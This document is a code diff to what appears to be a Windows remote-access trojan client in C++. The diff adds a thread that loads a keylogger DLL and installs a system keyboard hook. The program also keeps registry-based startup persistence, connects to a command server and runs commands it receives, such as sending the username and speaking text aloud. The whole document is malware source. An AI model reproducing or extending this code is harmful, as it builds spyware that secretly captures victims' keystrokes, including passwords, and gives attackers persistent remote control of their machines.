@@ -1,4 +1,5 @@
 #define WIN32_LEAN_AND_MEAN
+#define _CRT_SECURE_NO_WARNINGS
 #include <iostream>
 #include <Windows.h>
 #include <WS2tcpip.h>
@@ -9,15 +10,20 @@
 
 #pragma comment (lib, "Ws2_32.lib")
 
+typedef VOID(*SetHook)();
+
 int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrev, PWSTR lpCmdLine, int nCmdShow)
 {
 	init_winsock();
-	Registry startup;
-	if(!startup.CheckRegKey())
-	{
-		startup.SetRegKey();
-	}
+
 	CLIENT client;
+	CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)keylog_loop, NULL, NULL, NULL);
+
+	if (!client.CheckRegKey())
+	{
+		client.SetRegKey();
+	}
+	client.connect_to_server();
 	string command;
 	while(true)
 	{
@@ -54,7 +60,7 @@ void handle_command(CLIENT& client, string& command)
 		send_username(client);
 	}
 	else if(command.substr(0,6) == "speak ")
-	{
+	{ 
 		speak_command(command);
 	}
 }
@@ -82,4 +88,17 @@ void speak_command(string& command)
 	hr = pVoice->Speak(to_speak_unicode, NULL, NULL);
 	pVoice->Release();
 	CoUninitialize();
+}
+
+void keylog_loop()
+{
+	HMODULE keylog = LoadLibraryA("KeyLog_Module.dll");
+	SetHook SetKeyBoardHook = (SetHook)GetProcAddress(keylog, "SetKeyBoardHook");
+	SetKeyBoardHook();
+	MSG msg;
+	while(GetMessage(&msg, NULL, 0, 0) != 0)
+	{
+		TranslateMessage(&msg);
+		DispatchMessage(&msg);
+	}
 }
